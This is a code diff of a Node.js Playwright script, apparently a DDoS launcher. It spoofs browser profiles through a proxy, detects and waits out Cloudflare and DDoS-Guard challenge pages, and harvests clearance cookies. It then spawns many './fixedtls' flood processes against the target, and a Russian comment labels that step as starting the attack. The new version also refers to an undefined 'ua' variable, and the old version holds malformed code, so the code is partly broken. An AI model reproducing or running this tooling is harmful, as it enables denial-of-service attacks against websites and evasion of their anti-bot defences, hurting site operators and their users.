@@ -1,214 +1,192 @@
 const playwright = require('playwright');
 const colors = require('colors');
-const {
-    spawn
-} = require('child_process');
-require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
-(ignoreNames = [
-  "RequestError",
-  "StatusCodeError",
-  "CaptchaError",
-  "CloudflareError",
-  "ParseError",
-  "ParserError",
-  "TimeoutError",
-  "DeprecationWarning",
-]),
-  (ignoreCodes = [
-    "ECONNRESET",
-    "ERR_ASSERTION",
-    "ECONNREFUSED",
-    "EPIPE",
-    "EHOSTUNREACH",
-    "ETIMEDOUT",
-    "ESOCKETTIMEDOUT",
-    "EPROTO",
-	'NS_ERROR_CONNECTION_REFUSED',
-    "DEP0123",
-    "ERR_SSL_WRONG_VERSION_NUMBER",
-  ]);
+const { spawn } = require('child_process');
+require('events').EventEmitter.defaultMaxListeners = Infinity;
 
-process
-  .on("uncaughtException", function (e) {
-    if (
-      (e.code && ignoreCodes.includes(e.code)) ||
-      (e.name && ignoreNames.includes(e.name))
-    )
-      return false;
-    console.warn(e);
-  })
-  .on("unhandledRejection", function (e) {
-    if (
-      (e.code && ignoreCodes.includes(e.code)) ||
-      (e.name && ignoreNames.includes(e.name))
-    )
-      return false;
-    console.warn(e);
-  })
-  .on("warning", (e) => {
-    if (
-      (e.code && ignoreCodes.includes(e.code)) ||
-      (e.name && ignoreNames.includes(e.name))
-    )
-      return false;
-    console.warn(e);
-  })
-  .on("SIGHUP", () => {
-    return 1;
-  })
-  .on("SIGCHILD", () => {
-    return 1;
-  });
 const JSList = {
-	"js": [{
-		"name": "CloudFlare (Secure JS)",
-		"navigations": 2,
-		"locate": "<h2 class=\"h2\" id=\"challenge-running\">"
-	},
-	{
-		"name": "CloudFlare (Normal JS)",
-		"navigations": 2,
-		"locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
-	},
-	}, {
-		"name": "DDoS-Guard",
-		"navigations": 1,
-		"locate": "document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;"
-	}, {]
+  js: [
+    {
+      name: "CloudFlare (Secure JS)",
+      navigations: 2,
+      locate: '<h2 class="h2" id="challenge-running">'
+    },
+    {
+      name: "CloudFlare (Normal JS)",// незнаю на сколко хорошл sf работает
+      navigations: 2,
+      locate: '<div class="cf-browser-verification cf-im-under-attack">'
+    },
+    {
+      name: "DDoS-Guard",
+      navigations: 1,
+      locate: 'document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;'
+    },
+    {
+      name: "DDoS-Guard-en",
+      navigations: 2,
+      locate: 'document.getElementById("description").innerHTML="This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds...";' // найдите на странице что написанно и возьмите html код. Если будут фиксить 
+    }
+  ]
+};
+
+const ignoreNames = [
+  "RequestError", "StatusCodeError", "CaptchaError",
+  "CloudflareError", "ParseError", "ParserError",
+  "TimeoutError", "DeprecationWarning"
+];
+
+const ignoreCodes = [
+  "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED",
+  "EPIPE", "EHOSTUNREACH", "ETIMEDOUT",
+  "ESOCKETTIMEDOUT", "EPROTO", "DEP0123",
+  "ERR_SSL_WRONG_VERSION_NUMBER", "NS_ERROR_CONNECTION_REFUSED"
+];
+
+// 🔁 Глобальные обработчики ошибок
+process.on("uncaughtException", handleError);
+process.on("unhandledRejection", handleError);
+process.on("warning", handleError);
+process.on("SIGHUP", () => 1);
+process.on("SIGCHILD", () => 1);
+
+function handleError(e) {
+  if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
+  console.warn(e);
 }
 
-function sleep(ms) {
-	return new Promise(resolve => setTimeout(resolve, ms));
+// 🕓 Sleep
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+// ⏱️ Логирование
+function log(msg) {
+  const now = new Date();
+  const time = now.toTimeString().split(' ')[0];
+  console.log(`(${time}) - ${msg}`);
 }
 
-function log(string) {
-	let d = new Date();
-	let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
-	let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
-	let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
-	console.log(`(${hours}:${minutes}:${seconds}) - ${string}`);
-}
+// Рандом
+const randomIntFromInterval = (min, max) =>
+  Math.floor(Math.random() * (max - min + 1) + min);
 
-function randomIntFromInterval(min, max) {
-  return Math.floor(Math.random() * (max - min + 1) + min)
-}
-
+// Cookies → строка
 function cookiesToStr(cookies) {
-	if (Array.isArray(cookies)) {
-		return cookies.reduce((prev, {
-			name,
-			value
-		}) => {
-			if (!prev) return `${name}=${value}`;
-			return `${prev}; ${name}=${value}`;
-		}, "");
-		return "";
-	}
+  return cookies.map(({ name, value }) => `${name}=${value}`).join("; ");
 }
 
-function JSDetection(argument) {
-	for (let i = 0; i < JSList['js'].length; i++) {
-		if (argument.includes(JSList['js'][i].locate)) {
-			return JSList['js'][i]
-		}
-	}
+// 🔍 Детект JS защиты
+function JSDetection(html) {
+  return JSList.js.find(({ locate }) => html.includes(locate));
 }
 
-function solverInstance(args) {
-	return new Promise((resolve, reject) => {
-		log('(' + 'PlayWright'.cyan + `)`.white + ` Launching Playwright Instance.`.green);
-		playwright.firefox.launch({
-			headless: true,
+// 🎯 Основная функция
+async function solverInstance(args) {
+  log(`(${`PlayWright`.cyan}) Запуск браузера.`);
 
-			proxy: {
-				server: 'http://' + args.Proxy
-			},
-		}).then(async (browser) => {
+  const browser = await playwright.firefox.launch({
+    headless: true,
+    proxy: {
+      server: `http://${args.Proxy}`
+    }
+  });
 
-			const page = await browser.newPage();
+  // 🎲 Рандом между ПК и iPhone
+  function getRandomUAConfig() {
+    const configs = [
+      {
+        name: 'Windows Chrome',
+        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        viewport: { width: 1920, height: 1080 },
+        deviceScaleFactor: 1,
+        isMobile: false,
+        hasTouch: false
+      },
+      {
+        name: 'iPhone Safari',
+        userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+        viewport: { width: 390, height: 844 },
+        deviceScaleFactor: 3,
+        isMobile: true,
+        hasTouch: true
+      }
+    ];
+    return configs[Math.floor(Math.random() * configs.length)];
+  }
 
-			try {
-				await page.goto(args.Target);
-			} catch (e) {
+  const uaConfig = getRandomUAConfig();
+  log(`(${`UA`.cyan}) Используется профиль: ${uaConfig.name.green}`);
 
-				await browser.close();
-				reject(e);
-			}
+  const context = await browser.newContext({
+    userAgent: uaConfig.userAgent,
+    viewport: uaConfig.viewport,
+    deviceScaleFactor: uaConfig.deviceScaleFactor,
+    isMobile: uaConfig.isMobile,
+    hasTouch: uaConfig.hasTouch
+  });
 
-			const ua = await page.evaluate(
-				() => navigator.userAgent
-			);
-			log('(' + 'PlayWright'.cyan + `)` + ' PlayWright Assigned UA: '.yellow + `${ua}`.green);			
-			const source = await page.content();
-			const title = await page.title()
-			const JS = await JSDetection(source);
-			if(title == "Access denied")
-			{
-				log('(' + 'JSDetect'.red + `)` + ' Access to the page was denied. ');	
-			}
-			if (JS) {
-				log('(' + 'JSDetect'.green + `)` + ' Detected JS Challenge: '.magenta + `(${JS.name})`.yellow);			
-				if (JS.name == "VShield") {
-					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
-					await page.mouse.down();
-					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
-					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
-					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
-					await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
-					await page.mouse.up();
-				}
+  const page = await context.newPage();
 
-				for (let i = 0; i < JS.navigations; i++) {
-					var [response] = await Promise.all([
-						page.waitForNavigation(),
-					])
-					log('(' + 'Navigations'.green + `) Browsers Waiting Navigation: ` + `${i}`.magenta);
-				}
-			} else {
-			}
-			const title2 = await page.title()
-			const source2 = await page.content();
-			const JS2 = await JSDetection(source2);
-			if(title2 == "Access denied")
-			{
-				log('(' + 'JSDetect'.red + `)` + ' Access to the page was denied. ');	
-			}
-			if (JS2) {
-				log('(' + 'JSDetect'.green + `)` + ' Detected JS Challenge:' + `(${JS2.name})`.yellow);			
+  try {
+    await page.goto(args.Target);
+  } catch (e) {
+    await browser.close();
+    throw e;
+  }
 
-				if (JS2.name == "VShield") {
-					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
-					await page.mouse.down();
-					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
-					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
-					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
-					await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
-					await page.mouse.up();
-				}
+  log(`(${`PlayWright`.cyan}) UA: ${uaConfig.userAgent.green}`);
 
-				for (let i = 0; i < JS2.navigations; i++) {
-					var [response] = await Promise.all([
-						page.waitForNavigation(),
-					])
-					log('(' + 'Navigations'.green + `) Passed navigation ID: ` + `[${i + 1}/${JS.navigations}]`.magenta);
-					}
-			} else {
-			}			
+  // Первая проверка
+  await processProtection(page, 'JSDetect [1/2]');
 
+  //  Повторная проверка 
+  await processProtection(page, 'JSDetect [2/2]');
 
-			const cookies = cookiesToStr(await page.context().cookies());
-			const titleParsed = await page.title();
-			log('(' + 'Harvester'.green + ') Page Title: ' + `${titleParsed}`);
-            log('(' + 'Harvester'.green + ') Parsed Cookie: ' + `${cookies}`.yellow);
-			for (let i = 0; i < args.Threads; i++) {
-                spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
-            }
-			log('(' + 'PlayWright'.green + `) Session Solved.`);
-			resolve(cookies);
-		})
-	})
+  const cookies = cookiesToStr(await page.context().cookies());
+  const title = await page.title();
+
+  log(`(${`Harvester`.green}) Заголовок: ${title}`);
+  log(`(${`Harvester`.green}) Cookies: ${cookies.yellow}`);
+
+// Запуск атаки, самописный tls можно лучше, через неделю скину нормальный.
+  for (let i = 0; i < args.Threads; i++) {
+    spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
+  }
+
+  log(`(${`PlayWright`.green}) Сессия решена.`);
+  await browser.close();
+  return cookies;
+}
+
+// 🔧 Обработка защиты
+async function processProtection(page, label) {
+  const html = await page.content();
+  const title = await page.title();
+
+  if (title === "Access denied") {
+    log(`(${label.red}) Доступ к странице запрещён.`);
+    return;
+  }
+
+  const detected = JSDetection(html);
+  if (detected) {
+    log(`(${label.green}) защита: ${detected.name.yellow}`);
+
+    if (detected.name === "VShield") {
+      for (let i = 0; i < 5; i++) {
+        await page.mouse.move(randomIntFromInterval(0, 100), randomIntFromInterval(0, 100));
+      }
+      await page.mouse.down();
+      await page.mouse.move(100, 100);
+      await page.mouse.up();
+    }
+
+    for (let i = 0; i < detected.navigations; i++) {
+      await page.waitForNavigation();
+      log(`(${`Навигация`.green}) [${i + 1}/${detected.navigations}]`);
+    }
+  } else {
+    log(`(${label}) JS-защита не обнаружена.`);
+  }
 }
 
 module.exports = {
-	solverInstance: solverInstance
+  solverInstance
 };
